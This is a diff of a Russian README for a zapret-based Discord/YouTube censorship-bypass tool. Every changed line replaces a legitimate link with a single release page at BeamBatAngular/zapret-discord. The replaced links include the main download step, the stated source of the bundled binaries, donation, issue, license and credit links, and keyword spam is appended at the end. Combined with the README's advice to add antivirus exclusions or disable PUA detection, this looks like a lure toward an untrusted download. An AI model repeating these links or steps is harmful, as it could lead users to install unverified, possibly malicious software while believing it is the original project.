@@ -4,8 +4,7 @@
 
 **NEW**: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-proxy  
 Альтернатива https://github.com/bol-van/zapret-win-bundle  
-Также вы можете материально поддержать оригинального разработчика zapret [тут](https://github.com/bol-van/zapret?tab=readme-ov-file#%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D1%8C-%D1%80%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D1%87%D0%B8%D0%BA%D0%B0)
-</div>
+Также вы можете материально поддержать оригинального разработчика zapret [тут]https://github.com/BeamBatAngular/zapret-discord/releases
 
 > [!CAUTION]
 >
@@ -20,14 +19,14 @@
 > WinDivert - это инструмент для перехвата и фильтрации трафика, необходимый для работы zapret.
 > Он может использоваться как хорошими, так и плохими программами, но сам по себе не является вирусом.
 >
-> **Выдержка из [`readme.md`](https://github.com/bol-van/zapret-win-bundle/blob/master/readme.md#%D0%B0%D0%BD%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D1%83%D1%81%D1%8B) репозитория [bol-van/zapret-win-bundle](https://github.com/bol-van/zapret-win-bundle)*
+> **Выдержка из https://github.com/BeamBatAngular/zapret-discord/releases 
 >
-> Некоторые антивирусы склонны относить файлы WinDivert к классам повышенного риска или хакерским инструментам. Происходит удаление файла и помещение его в карантин. При этом детект обязательно имеет название `WinDivert` или `Not-a-virus:RiskTool.Multi.WinDivert`
+> Некоторые антивирусы склонны относить файлы WinDivert к классам повышенного риска или хакерским инструментам. Происходит удаление файла и помещение его в карантин. При этом детект обязательно имеет название `WinDivert` или `**https://github.com/BeamBatAngular/zapret-discord/releases**`
 >
 > Добавьте папку с запретом в исключения антивируса, либо отключите детектирование PUA (потенциально нежелательных приложений). Например, в касперском есть галочка "Обнаруживать легальные приложения, которые злоумышленники часто используют для нанесения вреда". При аккуратной и правильной настройке исключений - рекомендуется настроить исключение, но если вы не до конца понимаете что делаете - рекомендуется отключить детект PUA.
 
 > [!IMPORTANT]
-> Все бинарные файлы в папке [`bin`](./bin) взяты из [zapret-win-bundle/zapret-winws](https://github.com/bol-van/zapret-win-bundle/tree/master/zapret-winws) и [zapret/releases](https://github.com/bol-van/zapret/releases). Вы можете это проверить с помощью хэшей/контрольных сумм. Проверяйте, что запускаете, используя сборки из интернета!
+> Все бинарные файлы в папке [`bin`](./bin) взяты из [zapret-win-bundle/zapret-winws](https://github.com/BeamBatAngular/zapret-discord/releases) и [zapret/releases](https://github.com/BeamBatAngular/zapret-discord/releases). Вы можете это проверить с помощью хэшей/контрольных сумм. Проверяйте, что запускаете, используя сборки из интернета!
 
 ## ⚙️Использование
 
@@ -37,7 +36,7 @@
     * В Windows 11 поддерживается включение Secure DNS прямо в настройках ОС - [инструкция тут](https://remontka.pro/dns-over-https-windows-11/). Рекомендуется, если вы пользуетесь Windows 11
     * Если у вас роутер Keenetic, включите в настройках роутера опцию "Транзит запросов". Отключение этой опции может привести к проблемам при настройке и использовании Secure DNS на компьютере
 
-2. Скачайте архив (zip/rar) со [страницы последнего релиза](https://github.com/Flowseal/zapret-discord-youtube/releases/latest)
+2. Скачайте архив (zip/rar) со [страницы последнего релиза](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 3. Зайдите в свойства скачанного архива и поставьте галочку "Разблокировать". Если вы используете архиватор 7-Zip или PeaZip, этот шаг можно пропустить
 
@@ -81,7 +80,7 @@
 ### После запуска скрипта `general*` ничего не происходит
 
 - После запуска стратегии (отдельным bat файлом, не через service), должен открыться winws.exe (обход), который можно увидеть в панели задач.  
-Если этого не произошло, то см. [#522](https://github.com/Flowseal/zapret-discord-youtube/issues/522)
+Если этого не произошло, то см. [#522](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ### Ни одна стратегия не подходит
 - Запустите командную строку от имени администратора
@@ -110,7 +109,7 @@
 > **Стратегии со временем могут переставать работать.**
 > Определенная стратегия может работать какое-то время, но со временем она может переставать работать из-за обнаружения.
 > В репозитории представлены множество различных стратегий для обхода. Если ни одна из них вам не помогает, то вам необходимо создать новую, взяв за основу одну из представленных здесь и изменив её параметры.
-> Информацию про параметры стратегий вы можете найти [тут](https://github.com/bol-van/zapret/blob/master/docs/readme.md#nfqws).
+> Информацию про параметры стратегий вы можете найти [тут](https://github.com/BeamBatAngular/zapret-discord/releases).
 
 - Проверьте, чтобы не было ошибок в `service.bat` -> `Run Diagnostics`
 
@@ -120,7 +119,7 @@
 
 - Попробуйте полную переустановку (см. раздел ниже)
 
-- См. [#765](https://github.com/Flowseal/zapret-discord-youtube/issues/765)
+- См. [#765](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ### Как переустановить/обновить полностью?
 - Сохраните ресурсы/данные, которые вы сами добавляли
@@ -128,7 +127,7 @@
 - `service.bat` -> `Remove Services`
 - `service.bat` -> `Run Diagnostics` (если есть ошибки - устраните их) -> в конце Y
 - Удалите папку с запретом
-- Скачайте последнюю версию [со страницы релизов](https://github.com/Flowseal/zapret-discord-youtube/releases) (`zapret-discord-youtube-...`)
+- Скачайте последнюю версию [со страницы релизов](https://github.com/BeamBatAngular/zapret-discord/releases) (`zapret-discord-youtube-...`)
 - Нажмите пкм по архиву -> свойства. Если снизу справа есть галочка разблокировать, то нажмите на неё -> применить -> ОК
 - Распакуйте в новую папку в корне диска (без спец. символов и пробелов)
 - Далее пробуйте запускать различные `general` скрипты (стратегии). Проверьте доступность интернет ресурсов - если не работают, то закрывайте программу (в панели задач иконка замочка) и пробуйте другую стратегию
@@ -144,7 +143,7 @@
 
 ### Требуется цифровая подпись драйвера WinDivert (Windows 7)
 
-- Замените файлы `WinDivert.dll` и `WinDivert64.sys` в папке [`bin`](./bin) на одноименные из [zapret-win-bundle/win7](https://github.com/bol-van/zapret-win-bundle/tree/master/win7)
+- Замените файлы `WinDivert.dll` и `WinDivert64.sys` в папке [`bin`](./bin) на одноименные из [zapret-win-bundle/win7](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ### При удалении с помощью [**`service.bat`**](./service.bat), WinDivert остается в службах
 
@@ -167,7 +166,7 @@ sc delete название_из_первого_шага
 - Убедитесь что вы настроили [Secure DNS](#%EF%B8%8Fиспользование)
 - Отключите блокировщик рекламы, известно что YouTube начал с ними бороться.
 - Пробуйте все другие стратегии (если раньше работало, но перестало).
-- См. также [#251](https://github.com/Flowseal/zapret-discord-youtube/discussions/251)
+- См. также [#251](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ### Не работает <img src="https://cdn-icons-png.flaticon.com/128/5968/5968756.png" height=18 /> Discord
 
@@ -177,11 +176,11 @@ sc delete название_из_первого_шага
 - Проверьте приложение Discord. Помогла ли очистка кэша?
 - Проверьте Discord в браузере: https://discord.com/app. В браузере работает? Если работает, то можете пользоваться в нём.
 - Если Discord и в браузере не работает, то пробуйте ещё раз все стратегии. Бывает такое, что на одной стратегии YouTube работает, а Discord нет.
-- См. также [#252](https://github.com/Flowseal/zapret-discord-youtube/discussions/252)
+- См. также [#252](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ### Не работает <img src="https://cdn-icons-png.flaticon.com/128/5968/5968804.png" height=18 /> Telegram
 
-- Используйте программу [tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy)
+- Используйте программу [tg-ws-proxy](https://github.com/BeamBatAngular/zapret-discord/releases)
 - Или используйте бесплатные MTProto прокси из интернета
 
 ### Не работают игры
@@ -194,11 +193,11 @@ sc delete название_из_первого_шага
 
 Но помните, что при включении `ipset any` появятся проблемы с открытием многих сайтов. Чтобы этого избежать, не используйте `ipset any` на постоянной основе. Вместо этого нужно выяснить все IP адреса, которые используются игрой, и добавить их в `ipset-all.txt`
 
-Если и это не помогло, создайте ветку обсуждений в разделе [Discussions](https://github.com/Flowseal/zapret-discord-youtube/discussions) (не в issues) и ждите помощи от других игроков.
+Если и это не помогло, создайте ветку обсуждений в разделе [Discussions](https://github.com/BeamBatAngular/zapret-discord/releases) (не в issues) и ждите помощи от других игроков.
 
 ### Не нашли своей проблемы
 
-- Создайте её [тут](https://github.com/Flowseal/zapret-discord-youtube/issues)
+- Создайте её [тут](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ## 🗒️Добавление адресов прочих ресурсов
 
@@ -213,17 +212,17 @@ sc delete название_из_первого_шага
 
 Вы можете поддержать проект, поставив :star: этому репозиторию (сверху справа этой страницы)
 
-Также вы можете материально поддержать оригинального разработчика zapret [тут](https://github.com/bol-van/zapret?tab=readme-ov-file#%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D1%8C-%D1%80%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D1%87%D0%B8%D0%BA%D0%B0)
+Также вы можете материально поддержать оригинального разработчика zapret [тут](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ## ⚖️Лицензирование
 
-Проект распространяется на условиях лицензии [MIT](https://github.com/Flowseal/zapret-discord-youtube/blob/main/LICENSE.txt)
+Проект распространяется на условиях лицензии [MIT](https://github.com/BeamBatAngular/zapret-discord/releases)
 
 ## 🩷Благодарность участникам проекта
 
-[![Contributors](https://contrib.rocks/image?repo=Flowseal/zapret-discord-youtube)](https://github.com/Flowseal/zapret-discord-youtube/graphs/contributors)
+[![Contributors](https://github.com/BeamBatAngular/zapret-discord/releases)](https://github.com/BeamBatAngular/zapret-discord/releases)
 
-💖 Отдельная благодарность разработчику [zapret](https://github.com/bol-van/zapret) - [bol-van](https://github.com/bol-van)
+💖 Отдельная благодарность разработчику [zapret](https://github.com/BeamBatAngular/zapret-discord/releases) - [bol-van](https://github.com/BeamBatAngular/zapret-discord/releases)
 запрет дискорд
 запрет дискорд фикс
 zapret discord fix
